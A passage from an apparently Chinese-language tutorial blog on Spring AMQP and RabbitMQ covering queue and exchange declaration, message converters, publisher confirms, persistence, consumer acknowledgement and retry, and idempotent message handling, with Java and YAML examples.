function_">fanout</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/* 构造函数为名称 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FanoutExchange</span>(<span class="string">&quot;test.fanout&quot;</span>);</span><br><span class="line">        <span class="comment">/* 等价于： */</span></span><br><span class="line">        <span class="comment">/* return ExchangeBuilder.fanoutExchange(&quot;test.fanout&quot;).build(); */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">fQueue1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="string">&quot;test.queue1&quot;</span>);</span><br><span class="line">        <span class="comment">/* 等价于（默认 durable queue）： */</span></span><br><span class="line">        <span class="comment">/* return QueueBuilder.durable(&quot;test.queue1&quot;).build(); */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">fQueue2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="string">&quot;test.queue2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 自动注入 queue 和 exchange，从上面的 bean 寻找，采用 autowired-by-name 策略 */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindingQueue</span><span class="params">(Queue fQueue1, FanoutExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(fQueue1).to(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindingQueue</span><span class="params">(Queue fQueue2, FanoutExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(fQueue2).to(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Method-2-Listener-注解式声明"><a href="#Method-2-Listener-注解式声明" class="headerlink" title="Method 2. Listener 注解式声明"></a>Method 2. Listener 注解式声明</h4><p>显然这种方法非常麻烦，主要有以下的问题：</p><ul><li><p>每个方法大同小异，大部分是 boilerplate code；</p></li><li><p>定义步骤相当繁琐每定义一个队列、交换机或者绑定关系，就要新建一个方法；</p></li><li>很多队列或者交换机的 bean，只能通过 <code>autowired-by-name</code> 的方法注入，降低了代码可读性和可维护性；</li></ul><p>于是可以使用另一种定义方式，直接使用 <code>@RabbitListener</code> 提供的 <code>bindings</code> 参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(</span></span><br><span class="line"><span class="meta">    bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">        value = @Queue(value = &lt;Queue Name&gt;, [durable = &quot;true&quot; | &quot;false&quot;]),</span></span><br><span class="line"><span class="meta">        exchange = @Exchange(value = &lt;Exchange Name&gt;, type = ExchangeTypes.?),</span></span><br><span class="line"><span class="meta">        key = &#123; /* bindingKeys [String Array] */ &#125;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line"><span class="meta">)</span></span><br></pre></td></tr></table></figure><p>只需要声明一个注解即可定义队列、交换机、绑定关系；</p><p>但是上面的 Method 2 可能还是有问题：</p><ul><li><p>配置散落在业务代码中，没有与业务逻辑解耦；</p></li><li><p>这么写可能存在 queue / exchange 重复定义的问题，而且需要保证每次声明同样对象的配置一致。降低了可维护性和可扩展性；</p></li><li>在每个方法前面写这么大段注解，降低代码可读性；</li></ul><p>有什么办法解决吗？可以综合 Method 1 使用 ~</p><h3 id="1-2-6-Spring-AMQP-消息转换器"><a href="#1-2-6-Spring-AMQP-消息转换器" class="headerlink" title="1.2.6 Spring AMQP 消息转换器"></a>1.2.6 Spring <code>AMQP</code> 消息转换器</h3><p>注意，到目前为止，我们没有讨论过队列传输的对象是 <code>POJO</code> 或者是更复杂的 Java 对象的情况。</p><p>我们知道如果传输的是简单的 Java String，则 <code>RabbitMQ</code> 直接在队列上传输字符串；但是对于一般的 Java 对象，<code>RabbitMQ</code> 会使用 Java 内置的序列化实现将对象转为 Java Serializable Object；</p><p>我们跟踪 Spring <code>RabbitTemplate</code> 源码发现，内部对 <code>Object</code>（传递的信息）执行了 <code>convertMessageIfNecessary</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"><span class="keyword">protected</span> Message <span class="title function_">covertMessageIfNecessary</span><span class="params">(<span class="keyword">final</span> Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object <span class="keyword">instanceof</span> Message) &#123;</span><br><span class="line">        <span class="keyword">return</span> (Message) object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getRequiredMessageConverter().toMessage(object, <span class="keyword">new</span> <span class="title class_">MessageProperties</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure><p><code>Message</code> 类型是 <code>AMQP</code> 定义的接口，定义了帮助 <code>AMQP</code> 传输消息的方法。</p><p>我们进一步了解发现 <code>getRequiredMessageConverter()</code> 方法是获取 <code>RabbitTemplate</code> 的实例属性 <code>messageConverter</code>，<strong>其类型是 <code>MessageConverter</code>，默认实现是 <code>SimpleMessageConverter</code></strong>；</p><p>再查看 <code>MessageConverter</code> 的接口实现可以发现 Spring 中存在很多实现，例如 <code>Jackson2XmlMessageConverter / Jackson2JsonMessageConverter / ...</code>；</p><p>那么这些 converter 具体是如何将一般的 <code>Object</code> 转换为 <code>Message</code> 的呢？</p><p>我们找到 <code>MessageConverter</code> 接口的 <code>toMessage()</code> 方法，发现其在 <code>SimpleMessageConverter</code> 中的实现如下：</p><p><img src="imgs/smc-createMessage.png"></p><p>注意到，对于非空非 <code>byte[] / String</code> 类型的可序列化对象，<code>SimpleMessageConverter</code> 会直接将对象序列化（默认 Java 的对象流 <code>ObjectOutputStream</code>）。</p><p>这样做一般情况下没什么，但是在消息中间件中不建议使用，具体有以下几点原因：</p><ul><li><code>JDK</code> 的 <code>ObjectOutputStream</code> 本身存在安全风险（可以轻松反序列化并且进行代码注入）；</li><li><code>JDK</code> 的对象数据流大小往往很大，存放了一些并不需要传输的数据（几个 byte 的数据可能被序列化成几百个 byte 的数据，降低了传输性能，限制了消息吞吐量）；</li></ul><p>这里建议使用 <code>Jackson2JsonMessageConverter</code>。我们只需要在发送模块书写一个 <code>Bean</code> 配置类，然后让 Spring Boot 自动装配即可。</p><blockquote><p>确保引入依赖 <code>com.fasterxml.jackson.core:jackson-databind</code>；</p></blockquote><h2 id="1-3-Spring-AMQP-实战：消息中间件替换-OpenFeign-同步远程调用"><a href="#1-3-Spring-AMQP-实战：消息中间件替换-OpenFeign-同步远程调用" class="headerlink" title="1.3 Spring AMQP 实战：消息中间件替换 OpenFeign 同步远程调用"></a>1.3 Spring <code>AMQP</code> 实战：消息中间件替换 <code>OpenFeign</code> 同步远程调用</h2><blockquote><p>小贴士：如果设置了消费者确认机制并且使用 <code>auto</code> 模式，使用 <code>@RabbitListener</code> 注解的函数返回类型必须是 <code>void</code>。否则 RabbitMQ 会认为 consumer 执行错误。</p></blockquote><h1 id="Chapter-2-MQ-进阶：消息可靠性"><a href="#Chapter-2-MQ-进阶：消息可靠性" class="headerlink" title="Chapter 2. MQ 进阶：消息可靠性"></a>Chapter 2. MQ 进阶：消息可靠性</h1><p>使用 Spring <code>AMQP</code> 进行服务间异步通信可能存在一些问题：</p><ul><li>消息发布方网络丢包，导致消息丢失；</li><li>消息被 MQ 正确接受到后，MQ 宕机导致消息丢失；或者消费者速度较低，MQ 产生内存中的消息积压（内存占满的刷盘期间）可能造成消息丢失；</li><li>在 MQ 发送给消息消费方时，消费方宕机导致消息丢失；</li></ul><p>因为网络的不可靠性，即便我们针对上述问题进行保护措施，仍然可能出现一些问题。我们最终需要一些兜底的机制，至少需要确保消息的最终一致性。</p><p>接下来将会以 RabbitMQ 为例，从上面 4 个角度分析 MQ 如何保证消息的可靠性。</p><h2 id="2-1-消息发布方的可靠性：重连与确认机制"><a href="#2-1-消息发布方的可靠性：重连与确认机制" class="headerlink" title="2.1 消息发布方的可靠性：重连与确认机制"></a>2.1 消息发布方的可靠性：重连与确认机制</h2><h3 id="2-1-1-发送者重连-性能警告"><a href="#2-1-1-发送者重连-性能警告" class="headerlink" title="2.1.1 发送者重连 [性能警告]"></a>2.1.1 发送者重连 [性能警告]</h3><p>发送者重连，在 MQ 与消息发布方连接后，存在连接断开的情况，这可能导致发布方网络丢包；因此需要 MQ 和服务发布方在网络丢失后进行重连，特别地，在 RabbitMQ 中需要<strong><u>在消息发送方</u></strong>进行配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">connection-timeout:</span> <span class="string">1s</span><span class="comment"># MQ 连接超时时间（连接等待多长时间才算失败，失败后才进行重连）</span></span><br><span class="line">        <span class="attr">template:</span></span><br><span class="line">            <span class="attr">retry:</span></span><br><span class="line">                <span class="attr">enable:</span> <span class="literal">true</span><span class="comment"># 消息重连（默认 false）</span></span><br><span class="line">                <span class="attr">initial-interval:</span> <span class="string">1000ms</span><span class="comment"># 连接失败/断开后的初识等待时间（立即尝试的成功概率小）</span></span><br><span class="line">                <span class="attr">multiplier:</span> <span class="number">1</span><span class="comment"># 尝试等待时间倍数（下次等待时间为上次的倍数。第二次相对于 initial-interval）</span></span><br><span class="line">                <span class="attr">max-attempts:</span> <span class="number">3</span><span class="comment"># 最大尝试次数</span></span><br></pre></td></tr></table></figure><p>但是这种机制是<strong>阻塞式重连</strong>，对业务性能会造成影响，这也是为什么 <code>retry</code> 默认配置是禁用的。如果必须要使用，也需要合理设置超时、等待时长，以及尝试次数；</p><h3 id="2-1-2-发送者确认-性能警告"><a href="#2-1-2-发送者确认-性能警告" class="headerlink" title="2.1.2 发送者确认 [性能警告]"></a>2.1.2 发送者确认 [性能警告]</h3><p>发送者确认：Spring <code>AMQP</code> 提供了 Publish Confirm（消息确认反馈）和 Publisher Return（路由错误返回信息）两种机制。</p><p><strong>在发送者确认机制打开后，当消息发布方向 MQ 发送一条消息，MQ 会返回<u>确认结果</u>给发送方</strong>，确认结果分为以下几种情况：</p><ul><li><p>消息成功投递到 MQ 中，但是路由失败：MQ 通过 Publisher Return 返回路由错误原因，返回 <code>ACK</code> 告知投递成功；</p><blockquote><p>这种情况只可能是：exchange 没有绑定队列 / routing key 没有匹配队列，是开发者原因。与网络、发送方、MQ 都没有关系，所以认为投递成功。</p><p>这种情况重新发送消息是没有意义的，因为错误不会因为重试而修复。</p></blockquote></li><li><p><strong><u>临时消息</u></strong>投递到 MQ 中，且成功入队；MQ 反馈 <code>ACK</code> 告知投递成功；</p><blockquote><p>临时消息对于队列是否是 <code>durable</code> 的没有要求，只要投递到 MQ 中，并且进入队列内存，就算成功；</p></blockquote></li><li><p><strong><u>持久消息</u></strong>投递到 MQ 中，且成功入队，且成功持久化；MQ 反馈 <code>ACK</code> 告知投递成功；</p><blockquote><p>持久消息需要被 MQ 放入 durable 队列中，并且持久化才算投递成功，这样可以防止 MQ 宕机造成消息丢失。</p><p>同时这可能损失一部分性能，所以应该根据业务逻辑来选择持久消息或临时消息。</p></blockquote></li><li><p>其他任何情况都会反馈 <code>NACK</code>，表示投递失败。<strong><u>只有在这种情况下，进行消息重发是正确的、有意义的</u></strong>；</p></li></ul><p>以 RabbitMQ 为例，开启发送者确认机制需要<strong><u>在消息发送方</u></strong>进行配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">publisher-confirm-type:</span> <span class="string">correlated</span><span class="comment"># 开启 Publish Confirm 机制，指定模式类型</span></span><br><span class="line">        <span class="attr">publish-return:</span> <span class="literal">true</span><span class="comment"># 开启 Publish Return 机制</span></span><br></pre></td></tr></table></figure><p>所谓 Publish Confirm 只包含了 <code>ACK / NACK</code> 的消息，而 Publish Return 则<strong>回调上面第一种投递成功，但路由失败的失败信息</strong>。</p><p>Publish Confirm 的 3 种模式分别为：</p><ul><li><code>none</code>：关闭 Publish Confirm 机制；</li><li><code>simple</code>：同步阻塞等待 MQ 的确认；</li><li><code>correlated</code>：MQ 异步回调方式确认；</li></ul><p>那么如何配置 MQ 的异步回调（confirm callback 和 return callback）？</p><p>事实上，一个 <code>RabbitTemplate</code> 只能配置一个 Return Callback（<strong>需要启用 Publish Return 机制</strong>）。所以需要在 Spring 项目启动过程中配置一次：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MqConfig</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RabbitTemplate rabbitTemplate;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 在构造函数完成后执行一次 */</span></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        rabbitTemplate.setReturnsCallback(</span><br><span class="line">            <span class="comment">/* RabbitTemplate.ReturnsCallback 是一个函数接口 */</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">RabbitTemplate</span>.ReturnsCallback() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">returnMessage</span><span class="params">(ReturnedMessage msg)</span> &#123;</span><br><span class="line">                    log.error(<span class="string">&quot;Return callback triggered.&quot;</span>);</span><br><span class="line">                    log.debug(<span class="string">&quot;exchange: &#123;&#125;&quot;</span>, returned.getExchange());</span><br><span class="line">                    log.debug(<span class="string">&quot;routingKey: &#123;&#125;&quot;</span>, returned.getRoutingKey());</span><br><span class="line">                    log.debug(<span class="string">&quot;message: &#123;&#125;&quot;</span>, returned.getMessage());</span><br><span class="line">                    log.debug(<span class="string">&quot;replyCode: &#123;&#125;&quot;</span>, returned.getReplyCode());</span><br><span class="line">                    log.debug(<span class="string">&quot;replyText: &#123;&#125;&quot;</span>, returned.getReplyText());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于单条消息而言还有 Confirm Callback（<strong>需要启用 Publish Confirm 机制</strong>），这在每条消息发送前都需要配置一次：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testPublisherConfirm</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">// 1. 创建 CorrelationData，包含消息的全局 ID（MQ 需要区别消息以发送 confirm 或 return）</span></span><br><span class="line">    <span class="type">CorrelationData</span> <span class="variable">cd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorrelationData</span>(</span><br><span class="line">        UUID.randomUUID().toString()<span class="comment">/* 注：UUID 可能存在性能问题和 MAC 地址安全问题 */</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 2.给 Future 添加 ConfirmCallback</span></span><br><span class="line">    cd.getFuture().addCallback(</span><br><span class="line">        <span class="comment">/* ListenableFutureCallback 是一个含有 onFailure 和 onSuccess 的接口 */</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ListenableFutureCallback</span>&lt;CorrelationData.Confirm&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(Throwable ex)</span> &#123;</span><br><span class="line">                <span class="comment">// 2.1.Future发生异常时的处理逻辑，基本不会触发</span></span><br><span class="line">                log.error(<span class="string">&quot;handle message ack fail&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* 请类比 JavaScript 的 Promise，思考为什么即便是投递失败也在 onSuccess 中 */</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccess</span><span class="params">(CorrelationData.Confirm result)</span> &#123;</span><br><span class="line">                <span class="comment">// 2.2.Future接收到回执的处理逻辑，参数中的result就是回执内容</span></span><br><span class="line">                <span class="keyword">if</span> (result.isAck()) &#123;</span><br><span class="line">                    <span class="comment">// result.isAck()，boolean类型</span></span><br><span class="line">                    <span class="comment">// true代表ack回执，false 代表 nack回执</span></span><br><span class="line">                    log.debug(<span class="string">&quot;发送消息成功，收到 ack!&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// result.getReason()，String类型，返回nack时的异常描述</span></span><br><span class="line">                    log.error(</span><br><span class="line">                        <span class="string">&quot;发送消息失败，收到 nack, reason : &#123;&#125;&quot;</span>, result.getReason()</span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 3.发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(<span class="string">&quot;test.direct&quot;</span>, <span class="string">&quot;red1&quot;</span>, <span class="string">&quot;hello&quot;</span>, cd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还要提一点，发送确认也会对性能有较大影响。而且发送丢包的概率较低，所以只建议在亟需确保数据可靠性的极端情况下才需要如此配置。</p><h2 id="2-2-MQ-的可靠性"><a href="#2-2-MQ-的可靠性" class="headerlink" title="2.2 MQ 的可靠性"></a>2.2 MQ 的可靠性</h2><p>如上所述，MQ 可能丢失消息的场景有两类：</p><ul><li>消息被 MQ 正确接受到后，MQ 宕机导致消息丢失；</li><li>消费者速度很低，MQ 产生内存中的消息积压阻塞（内存占满的刷盘期间无法继续入队）可能造成消息丢失；</li></ul><p>具体有两种思路可以解决，一是数据持久化策略，二是 Lazy Queue；</p><h3 id="2-2-1-MQ-的数据持久化-默认"><a href="#2-2-1-MQ-的数据持久化-默认" class="headerlink" title="2.2.1 MQ 的数据持久化 [默认]"></a>2.2.1 MQ 的数据持久化 [默认]</h3><ul><li><p>交换机持久化、队列持久化（默认都是 durable）；</p><blockquote><p>交换机、队列的持久化，是指交换机 / 队列自身的信息也会持久化在磁盘中；</p></blockquote></li><li><p>消息持久化。我们在之前提到，临时消息不会被 MQ 保证持久化到磁盘中，意味着这类消息在掉电后可能丢失。所以如果对一类消息的正确性要求很高，需要将消息设置为持久消息：</p><p>由于 <code>RabbitTemplate</code> 默认的 <code>convertAndSend</code> 方法中的 message converter 都默认构建 Message 为持久的消息，因此我们需要手动构建才能得到临时消息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Message</span> <span class="variable">message</span> <span class="operator">=</span> MessageBuilder</span><br><span class="line">    .withBody(<span class="string">&quot;Hello, Spring AMQP&quot;</span>.getBytes(StandardCharsets.UTF_8))</span><br><span class="line">    .setDeliveryMode(MessageDeliveryMode.NON_PERSISTENT)</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure><p>如果使用大量数据实验会发现，大量、快速发送临时消息（不会主动刷盘）会不断在内存中积压，其触发的 Page Out（泛指内存耗尽触发的被动刷盘操作）会像数据结构 LSM Tree 的 compaction 操作一样短时间内迅速降低 MQ 的吞吐量，形成一个个性能低谷，总体性能反而小于持久数据（一开始就进行刷盘操作）；</p></li></ul><h3 id="2-2-2-Lazy-Queue-默认"><a href="#2-2-2-Lazy-Queue-默认" class="headerlink" title="2.2.2 Lazy Queue [默认]"></a>2.2.2 Lazy Queue [默认]</h3><p>在 Rabbit MQ 3.12 以后，所有队列默认 Lazy Queue 且无法更改。</p><p>Lazy Queue 的特征是，</p><ul><li>接收到消息后直接存入磁盘，不再存储到内存；</li><li>消费者要消费消息时才会从磁盘中读取并加载到内存（可以提前缓存部分消息到内存，最多2048条）；</li></ul><h2 id="2-3-消费者的可靠性"><a href="#2-3-消费者的可靠性" class="headerlink" title="2.3 消费者的可靠性"></a>2.3 消费者的可靠性</h2><h3 id="2-3-1-消费者确认机制"><a href="#2-3-1-消费者确认机制" class="headerlink" title="2.3.1 消费者确认机制"></a>2.3.1 消费者确认机制</h3><p>Spring <code>AMQP</code> 同样存在一种机制，即消费者确认机制（Consumer Acknowledgement）。</p><p>它是为了确认消费者是否成功处理消息。当消费者处理消息结束后，应该向 Rabbit MQ 发送一个回执，告知 Rabbit MQ 自己消息处理状态：</p><ul><li><code>ACK</code>：成功处理消息，Rabbit MQ 从队列（内存以及磁盘）中删除该消息；</li><li><code>NACK</code>：消息处理失败，Rabbit MQ 需要再次投递消息；</li><li><code>REJECT</code>：消息处理失败并拒绝该消息，Rabbit MQ 从队列（内存以及磁盘）中删除该消息；</li></ul><p>这个回执应该在消费者关于该消息所有业务逻辑处理完成后，才能返回，防止出错后无法重试。</p><p>这样的操作非常类似 事务机制。</p><p>Spring <code>AMQP</code> 已经实现了消息确认功能。并允许我们通过配置文件选择ACK处理方式：</p><ul><li><p><code>none</code>：不处理。即消息投递给消费者后立刻 <code>ACK</code>，消息会立刻从 MQ 删除。非常不安全，不建议使用；</p></li><li><p><code>manual</code>：手动模式。需要自己在业务代码中调用 API，发送 <code>ACK</code> 或 <code>REJECT</code>，存在业务入侵，但更灵活；</p></li><li><p><code>auto</code>：自动模式。Spring <code>AMQP</code> 利用 <code>AOP</code> 对我们的消息处理逻辑做了环绕增强，当业务正常执行时则自动返回 <code>ACK</code>.  当业务出现异常时，根据异常判断返回不同结果：</p><ul><li><p>如果是业务异常，会自动返回 <code>NACK</code>，消息会重新进入 <code>Ready</code> 状态投递给对应消费者（重新处于 <code>Ready</code> 状态）；</p><blockquote><p>消费者宕机、抛出 <code>RuntimeException</code> / 其他自定义异常，都认为是 <code>NACK</code>；</p></blockquote></li><li><p>如果是消息处理或校验异常（需要抛出例如 <code>MessageConversionException</code>），自动返回 <code>REJECT</code>；</p><blockquote><p>这就提醒我们，遇到业务逻辑中的格式异常，请不要 throw <code>RuntimeException</code>，不然会被 Spring 认为是业务异常而重新发送！</p></blockquote></li></ul></li></ul><p>我们需要在消息消费方配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">listener:</span></span><br><span class="line">            <span class="attr">simple:</span></span><br><span class="line">                <span class="attr">prefetch:</span> <span class="number">1</span></span><br><span class="line">                <span class="attr">acknowledge-mode:</span> <span class="string">none</span><span class="comment"># 默认不处理，</span></span><br></pre></td></tr></table></figure><h3 id="2-3-2-消费者失败重试机制"><a href="#2-3-2-消费者失败重试机制" class="headerlink" title="2.3.2 消费者失败重试机制"></a>2.3.2 消费者失败重试机制</h3><p>在引入消费者确认机制后，还会出现一个问题：如果 MQ 中积压的消息量过大，导致消费方宕机，在消费者恢复后，没有进行请求热身，MQ 又重发了大量的消息，很有可能会再次导致消费方再次宕机。</p><p>这会给消费方和 MQ 都造成极大的压力。</p><p>为了应对这种情况，MQ 引入了另一种机制来保障消费方的消息可靠性：消费者失败重试机制。在消费者出现异常时按照配置重试，而不是无限的重复入队。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">listener:</span></span><br><span class="line">            <span class="attr">simple:</span></span><br><span class="line">                <span class="attr">prefetch:</span> <span class="number">1</span></span><br><span class="line">                <span class="attr">retry:</span><span class="comment"># 注：发送方重试位于 template 下</span></span><br><span class="line">                    <span class="attr">enabled:</span> <span class="literal">true</span><span class="comment"># 默认 false</span></span><br><span class="line">                    <span class="attr">initial-interval:</span> <span class="string">1000ms</span><span class="comment"># 失败初始等待时间</span></span><br><span class="line">                    <span class="attr">multiplier:</span> <span class="number">1</span></span><br><span class="line">                    <span class="attr">max-attempts:</span> <span class="number">3</span></span><br><span class="line">                    <span class="attr">stateless:</span> <span class="literal">true</span><span class="comment"># 如果业务中含有事务，说明这种消息重递是有状态的，应该 false</span></span><br></pre></td></tr></table></figure><p>在重试超过 <code>max-attempts</code> 后，消息状态转变为 requeue-exhausted，进而转入 <code>MessageRecoverer</code> 中处理。</p><p>Spring <code>AMQP</code> <strong>默认的 <code>MessageRecoverer</code> 的实现是 <code>RejectAndDontRequeueRecoverer</code></strong>，其策略是直接丢弃这条消息，这样做有失消费者安全性。</p><p>除了默认的 recoverer，还有两种：</p><ul><li><p><code>ImmediateRequeueMessageRecoverer</code>：重试耗尽后，仍然认为返回 <code>NACK</code>，重新入队；</p><blockquote><p>这种策略和不采取失败者重试的策略相比，性能影响会小一点；</p></blockquote></li><li><p><code>RepublishMessageRecoverer</code>：重试耗尽后，将消息（<strong>包括报错信息</strong>）投递到指定交换机，以供其他处理用途；</p><blockquote><p>这种策略也比较合理，认为反复投递无效就应该换一种处理方式。</p><p>但这种方法需要专门配置一个指定的交换机：</p><ul><li>定义接受失败队列、与其绑定的交换机；</li><li>定义 <code>RepublishMessageRecoverer</code> 的 Bean（传入 <code>RabbitTemplate</code>、交换机、队列名称）；</li></ul></blockquote></li></ul><p>这种机制虽然相较于原先确认机制而言，降低了可靠性，但是一定程度上提升了服务的可用性，降低多次/长时间宕机造成的资源浪费风险。</p><h2 id="2-4-业务幂等性保证"><a href="#2-4-业务幂等性保证" class="headerlink" title="2.4 业务幂等性保证"></a>2.4 业务幂等性保证</h2><p>在上面的过程中，有一种情况我们没有考虑：如果消费者的接口不是幂等的，就需要保证消息发送的不重复性。</p><p>也就是说，<strong>假设消费者收到消息后并且处理结束，要给 MQ 发送 <code>ACK</code> 时连接断开了（或者两方有一方宕机了），就可能会导致 MQ 消息重新发送</strong>。这个问题没办法借助 MQ 来解决，因为不是 MQ 本身的问题。</p><p>那么应该如何处理这种情况？</p><h3 id="2-4-1-唯一消息-ID"><a href="#2-4-1-唯一消息-ID" class="headerlink" title="2.4.1 唯一消息 ID"></a>2.4.1 唯一消息 ID</h3><p>第一种思路是唯一消息 ID：给每个消息都设置一个唯一 ID，利用 ID 区分是否是重复消息。</p><ul><li>每一条消息都生成一个唯一的 ID，与消息一起投递给消费者；</li><li>消费者接收到消息后处理自己的业务，业务处理成功后将消息 ID 保存到数据库；</li><li>如果下次又收到相同消息，去数据库查询判断是否存在，存在则为重复消息放弃处理。</li></ul><blockquote><p>Tips. 这和之前提到的发送者确认机制中创建的 <code>CorrelationData</code> 中的 ID 